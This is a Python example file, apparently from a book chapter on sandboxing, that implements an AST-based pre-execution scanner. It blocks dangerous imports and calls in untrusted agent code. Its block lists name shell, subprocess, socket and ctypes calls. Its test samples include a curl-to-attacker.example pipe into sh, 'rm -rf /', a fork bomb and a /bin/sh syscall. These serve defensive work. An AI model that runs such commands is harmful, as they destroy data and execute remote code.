"""
Runnable example: a pre-execution static scanner for untrusted Python code.

This is the APPLICATION-LEVEL complement to the OS-level layers covered
elsewhere in this chapter (KVM, seccomp, jailer). Those layers contain what
already-running code inside the guest can do to the host; this scanner's job
is to catch obviously dangerous code *before* it ever reaches the guest at
all, the same way a WAF sits in front of an application server that also has
its own input validation. Neither layer is a substitute for the other: a
seccomp filter still stops a fork bomb that slips past this scanner, and this
scanner still saves you the cost of launching a MicroVM for code you can
reject in milliseconds.

The scanner does source-level pattern matching, not sandboxed execution and
not a full AST-based taint analysis - it deliberately trades completeness
for simplicity and speed. A determined attacker can obfuscate past regex
matching (string concatenation, `getattr`, base64-encoded payloads passed to
`exec`), which is exactly why Chapter 7's MicroVM boundary and this chapter's
OS-level layers still have to be there. Treat this as one more layer, not
the layer.
"""

from __future__ import annotations

import ast
from dataclasses import dataclass, field


@dataclass
class ScanResult:
    """Result of scanning one snippet of code."""

    safe: bool
    violations: list[str] = field(default_factory=list)


# Module attributes that are almost never legitimate in untrusted, single-shot
# agent code and are common building blocks of a sandbox escape.
DANGEROUS_IMPORTS = {"ctypes", "cffi"}

# Fully-qualified call names ("module.attr" or "module.sub.attr") that are
# blocked outright.
DANGEROUS_CALLS = {
    "os.system",
    "os.popen",
    "os.fork",
    "os.execv",
    "os.execve",
    "os.execl",
    "subprocess.Popen",
    "subprocess.call",
    "subprocess.run",
    "subprocess.check_output",
    "socket.socket",
}

# Bare builtin names that are dangerous regardless of what module they came
# from, since they are always builtins in normal Python.
DANGEROUS_BUILTINS = {"eval", "exec", "__import__"}


class CodeScanner(ast.NodeVisitor):
    """Walks a parsed AST looking for dangerous imports and calls."""

    def __init__(self) -> None:
        self.violations: list[str] = []

    def visit_Import(self, node: ast.Import) -> None:
        for alias in node.names:
            root = alias.name.split(".")[0]
            if root in DANGEROUS_IMPORTS:
                self.violations.append(f"line {node.lineno}: import of '{alias.name}' is blocked")
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
        module = node.module or ""
        root = module.split(".")[0]
        if root in DANGEROUS_IMPORTS:
            self.violations.append(f"line {node.lineno}: import from '{module}' is blocked")
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call) -> None:
        qualified = self._qualified_name(node.func)
        if qualified in DANGEROUS_CALLS or qualified in DANGEROUS_BUILTINS:
            self.violations.append(f"line {node.lineno}: call to '{qualified}' is blocked")
        # subprocess.run(..., shell=True) / os.system-style shell invocation
        # via any call is doubly dangerous - flag shell=True regardless of
        # which function it's attached to, since a wrapper function can hide
        # the real target.
        for kw in node.keywords:
            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                self.violations.append(f"line {node.lineno}: 'shell=True' is blocked")
        self.generic_visit(node)

    @staticmethod
    def _qualified_name(node: ast.expr) -> str | None:
        """Reconstruct a dotted call target, e.g. Attribute(os, system) -> 'os.system'."""
        parts: list[str] = []
        while isinstance(node, ast.Attribute):
            parts.append(node.attr)
            node = node.value
        if isinstance(node, ast.Name):
            parts.append(node.id)
            return ".".join(reversed(parts))
        if not parts:
            return None
        return None


def scan_code(source: str) -> ScanResult:
    """Parse and scan a snippet of Python source for known-dangerous patterns.

    Returns ScanResult(safe=False, ...) for a syntax error too - code that
    doesn't parse can't be safely reasoned about, so it doesn't get a pass.
    """
    try:
        tree = ast.parse(source)
    except SyntaxError as exc:
        return ScanResult(safe=False, violations=[f"syntax error: {exc}"])

    scanner = CodeScanner()
    scanner.visit(tree)
    return ScanResult(safe=not scanner.violations, violations=scanner.violations)


def main() -> None:
    samples = {
        "safe: basic arithmetic": """
result = sum(x * x for x in range(10))
print(result)
""",
        "safe: pandas-style data work": """
import json
data = json.loads('{"a": 1, "b": 2}')
print(sorted(data.items()))
""",
        "dangerous: os.system shell-out": """
import os
os.system("curl http://attacker.example/exfiltrate | sh")
""",
        "dangerous: subprocess shell=True": """
import subprocess
subprocess.run("rm -rf /", shell=True)
""",
        "dangerous: raw ctypes syscall access": """
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.syscall(59, b"/bin/sh", None, None)
""",
        "dangerous: fork bomb": """
import os
while True:
    os.fork()
""",
        "dangerous: eval of untrusted string": """
user_input = "__import__('os').system('id')"
eval(user_input)
""",
        "dangerous: raw socket": """
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 22))
""",
    }

    for label, source in samples.items():
        result = scan_code(source)
        verdict = "ALLOW" if result.safe else "BLOCK"
        print(f"[{verdict}] {label}")
        for violation in result.violations:
            print(f"    - {violation}")


if __name__ == "__main__":
    main()
